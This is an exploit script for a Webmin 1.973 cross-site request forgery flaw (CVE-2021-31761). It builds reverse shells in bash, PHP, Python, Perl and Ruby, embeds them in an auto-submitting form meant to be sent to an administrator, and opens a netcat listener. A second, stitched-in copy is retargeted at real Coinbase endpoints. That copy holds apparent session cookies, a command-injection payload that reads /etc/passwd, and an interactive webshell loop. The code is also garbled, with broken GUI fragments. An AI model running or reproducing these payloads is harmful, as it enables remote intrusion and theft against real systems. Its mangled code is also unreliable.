# Exploit Title: Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)
# Date: 24/04/2021
# Exploit Author: Mesh3l_911 & Z0ldyck
# Vendor Homepage: https://www.webmin.com
# Repo Link: https://github.com/Mesh3l911/CVE-2021-31761
# Version: Webmin 1.973
# Tested on: All versions <= 1.973
# CVE: CVE-2021-31761
# Description: Exploiting a Reflected Cross-Site Scripting (XSS) attack to
# get a Remote Command Execution (RCE) through the Webmin's running process
# feature

import time, subprocess,random,urllib.parse
from hackers import *
def dos():
    dos = Frame(F2, bd=8, relief=GROOVE, bg="black")
    dos.place(x=252, y=71, relwidth=0.74, relheight=0.87)
    scroll_y = Scrollbar(dos, orient=VERTICAL)
    self.txtarea = Text(dos, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#ccc4c4", bg="#404040")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=self.txtarea.yview)
    self.txtarea.pack(fill=BOTH,expand=1) 
    self.txtarea.configure(state ='disabled')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        url = inp

print('''\033[1;37m

 __  __           _     ____  _          _________  _     _            _
|  \/  |         | |   |___ \| |        |___  / _ \| |   | |          | |
| \  / | ___  ___| |__   __) | |           / / | | | | __| |_   _  ___| | __
| |\/| |/ _ \/ __| '_ \ |__ <| |          / /| | | | |/ _` | | | |/ __| |/ /
| |  | |  __/\__ \ | | |___) | |  _ _    / /_| |_| | | (_| | |_| | (__|   <
|_|  |_|\___||___/_| |_|____/|_| (_|_)  /_____\___/|_|\__,_|\__, |\___|_|\_/
                                                             __/ |
                                                            |___/

    \033[1;m''')

for i in range(101):
    print(
        "\r\033[1;36m [>] POC By \033[1;m \033[1;37mMesh3l\033[1;m \033[1;36m ( \033[1;m\033[1;37m@Mesh3l_911\033[1;m\033[1;36m )  & \033[1;m \033[1;37mZ0ldyck\033[1;m\033[1;36m  ( \033[1;m\033[1;37m@electronicbots\033[1;m\033[1;36m ) \033[1;m {} \033[1;m".format(
            i), "\033[1;36m%\033[1;m", end="")
    time.sleep(0.02)
print("\n\n")

target = input(
    "\033[1;36m \n Please input ur target's webmin path e.g. ( https://webmin.Mesh3l-Mohammed.com/ ) > \033[1;m")

if target.endswith('/'):
    target = target + ''
else:
    target = target + '/'

ip = input("\033[1;36m \n Please input ur IP to set up the Reverse Shell e.g. ( 10.10.10.10 ) > \033[1;m")

port = input("\033[1;36m \n Please input a Port to set up the Reverse Shell e.g. ( 1337 ) > \033[1;m")

ReverseShell = input \
('''\033[1;37m
\n
1- Bash Reverse Shell \n
2- PHP Reverse Shell \n
3- Python Reverse Shell \n
4- Perl Reverse Shell \n
5- Ruby Reverse Shell \n
\033[1;m

\033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) > \033[1;m''')

file_name = random.randrange(1000)

if ReverseShell == '1':
    ReverseShell = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0</tmp/'+str(file_name)+' | /bin/sh >/tmp/'+str(file_name)+' 2>&1; rm /tmp/'+str(file_name)+''

elif ReverseShell == '2':
    ReverseShell = ''' php -r '$sock=fsockopen("''' + ip + '''",''' + port + ''');exec("/bin/sh -i <&3 >&3 2>&3");' '''

elif ReverseShell == '3':
    ReverseShell = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip + '''",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

elif ReverseShell == '4':
    ReverseShell = ''' perl -e 'use Socket;$i="''' + ip + '''";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''

elif ReverseShell == '5':
    ReverseShell = ''' ruby -rsocket -e'f=TCPSocket.open("''' + ip + '''",''' + port + ''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''

else:
    print("\033[1;36m \n Please Re-Check ur input :( \033[1;m \n")

Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
btn1 = Button(root, text = 'Quit !',command = root.destroy)
btn1.pack()
lbl = tk.Label(root, text = "")
lbl.pack()

def CSRF_Generator():
    Payload = urllib.parse.quote('''

<html>
        <head>
            <meta name="referrer" content="never">
        </head>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="/proc/run.cgi" method="POST">
      <input type="hidden" name="cmd" value="''' + ReverseShell + '''" />
      <input type="hidden" name="mode" value="0" />
      <input type="hidden" name="user" value="root" />
      <input type="hidden" name="input" value="" />
      <input type="hidden" name="undefined" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>

</html>

        ''')

    print("\033[1;36m\nHere's ur link , send it to a Webmin's Admin and wait for ur Reverse Shell ^_^ \n \n\033[1;m")

    print(target+Payload)

def Netcat_listener():
    print()
    subprocess.run(["nc", "-nlvp "+port+""])


def main():
    dos()
    CSRF_Generator()
    Netcat_listener()
 


if __name__ == '__main__':
    main()
"""

import time, subprocess,random,urllib.parse
import requests, sys, urllib, re
import datetime
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

print('''\033[1;37m

 __  __           _     ____  _          _________  _     _            _
|  \/  |         | |   |___ \| |        |___  / _ \| |   | |          | |
| \  / | ___  ___| |__   __) | |           / / | | | | __| |_   _  ___| | __
| |\/| |/ _ \/ __| '_ \ |__ <| |          / /| | | | |/ _` | | | |/ __| |/ /
| |  | |  __/\__ \ | | |___) | |  _ _    / /_| |_| | | (_| | |_| | (__|   <
|_|  |_|\___||___/_| |_|____/|_| (_|_)  /_____\___/|_|\__,_|\__, |\___|_|\_/
                                                             __/ |
                                                            |___/

    \033[1;m''')

for i in range(101):
    print(
        "\r\033[1;36m [>] POC By \033[1;m \033[1;37mMesh3l\033[1;m \033[1;36m ( \033[1;m\033[1;37m@Mesh3l_911\033[1;m\033[1;36m )  & \033[1;m \033[1;37mZ0ldyck\033[1;m\033[1;36m  ( \033[1;m\033[1;37m@electronicbots\033[1;m\033[1;36m ) \033[1;m {} \033[1;m".format(
            i), "\033[1;36m%\033[1;m", end="")
    time.sleep(0.02)
print("\n\n")

target = 'https://exceptions.external.coinbase.com/'#'http://nft.coinbase.com/?id='


ip = '192.168.4.7'

port = '4444'
s = requests.Session() 
header= {
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Dnt': '1',
#'X-q4-request-proto': "{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}",
'Referer': 'https://profile.coinbase.com/',
#'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
'Sec-Fetch-User': '?1',
'Origin': 'https://profile.coinbase.com',
'Connection': 'keep-alive',
'Upgrade-Insecure-Requests': '1',
'Cookie': 'cb_dm=ef8907c9-f316-4670-9849-30d8d475602b; coinbase_device_id=9f969640-3c8f-44b7-9f0b-692b208f1401; _ga=GA1.2.883939276.1684509868; _gid=GA1.2.2041890535.1684509868; coinbase_hide_download_cta=true; coinbase_device_id=58e1718c-064b-4700-98fd-46e5a4c99e9e; cf_clearance=RnfxGaKty1t.HLO.VdL3_mw_VGjEVNizB7JyYWnpRbo-1684848382-0-160; __cf_bm=Y06_WWs24wpjE4BO6mA8ikk3lQJnM.49WyGPOj3jbwc-1684851742-0-ATgFQ7zGTpvnDo8uKdDHudJ/i1UEi2gU98X0G5BBvyDStc2Q84qyOa/4Xp7bb/zKkjsmuGnJ/4uTH5NdaC5kXH0=; cf_chl_2=f8a6d31d25815f7',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'none',
'TE': 'trailers'
}
data ={"entries":[{"id":"{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}","name":"1khan.eth","type":"SEARCH_ENTITY_ENS","fields":[{"key":"Address","value":"0xad6b9a77120ded87b27231f7b433afca0b65c4b1"},{"key":"Hashname","value":"dfb598c1d52969eb6b1e795abd6944fe270978a55ef1fe9b910522e276f5a3a8"}]},{"id":"ethereum-mainnet/b9c293aa474523bcfd670a79c3a87e700c188bf7fa96daef177470e15fc564e5","name":"1khalifa.eth","type":"SEARCH_ENTITY_ENS","fields":[{"key":"Address","value":"0x36945796a96abc6849f9c5141ce5d4fb9a02da9a"},{"key":"Hashname","value":"b9c293aa474523bcfd670a79c3a87e700c188bf7fa96daef177470e15fc564e5"}]}]}

ReverseShell = input \
('''\033[1;37m
\n
1- Bash Reverse Shell \n
2- PHP Reverse Shell \n
3- Python Reverse Shell \n
4- Perl Reverse Shell \n
5- Ruby Reverse Shell \n
\033[1;m

\033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) > \033[1;m''')

file_name = random.randrange(1000)

if ReverseShell == '1':
    ReverseShell = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0</tmp/'+str(file_name)+' | /bin/sh >/tmp/'+str(file_name)+' 2>&1; rm /tmp/'+str(file_name)+''

elif ReverseShell == '2':
    ReverseShell = ''' php -r '$sock=fsockopen("''' + ip + '''",''' + port + ''');exec("/bin/sh -i <&3 >&3 2>&3");' '''

elif ReverseShell == '3':
    ReverseShell = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip + '''",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

elif ReverseShell == '4':
    ReverseShell = ''' perl -e 'use Socket;$i="''' + ip + '''";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''

elif ReverseShell == '5':
    ReverseShell = ''' ruby -rsocket -e'f=TCPSocket.open("''' + ip + '''",''' + port + ''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''

else:
    print("\033[1;36m \n Please Re-Check ur input :( \033[1;m \n")


Payload = {
               'personImage': 
                  (
                   'kh4waja.php', 
                   '''<html>
        <head>
            <meta name="referrer" content="never">
        </head>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="/proc/run.cgi" method="POST">
      <input type="hidden" name="cmd" value="''' + ReverseShell + '''" />
      <input type="hidden" name="mode" value="0" />
      <input type="hidden" name="user" value="root" />
      <input type="hidden" name="input" value="" />
      <input type="hidden" name="undefined" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>

</html>''', 
                   "hi", 
                  {'Content-Disposition': 'form-data'}
                  )} 
             #}urllib.parse.quote('''''')

print("\033[1;36m\nHere's ur link , send it to a Webmin's Admin and wait for ur Reverse Shell ^_^ \n \n\033[1;m")


def Netcat_listener():
    print()
    subprocess.run(["nc", "-nlvp "+port+""])


#def webshell(target, session):
    

def main():
    #CSRF_Generator()
    print("[*]Uploading PHP Shell For RCE...")
    upload = s.post(target,headers=header,data=data)#, files=Payload)
    response2 = upload.text
    print(upload,response2)
    shell_upload = True if("" in upload.text) else False
    u=shell_upload
    if u:
        print("[+]PHP Shell has been uploaded successfully!")
    else:
        print("[-]Failed To Upload The PHP Shell!")
    #WEB_SHELL = target,files=filenamefilename
    getdir  = {'cmd': 'echo %CD%'}
    r2 = s.post( target,data=Payload,headers=header, params=getdir, verify=False)
    status = r2.status_code
    print(status)
    if status != 200:
        print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
        r2.raise_for_status()
    print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
    cwd = re.findall('[CDEF].*', r2.text)
    cwd = cwd[0]+"> "
    term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
    while True:
        thought = input(term)
        command = {'cmd': thought}
        r2 = requests.post(target,data=Payload,headers=header, params=command, verify=False)
        status = r2.status_code
        if status != 200:
            r2.raise_for_status()
        response2 = r2.text
        print(response2)

main()
"""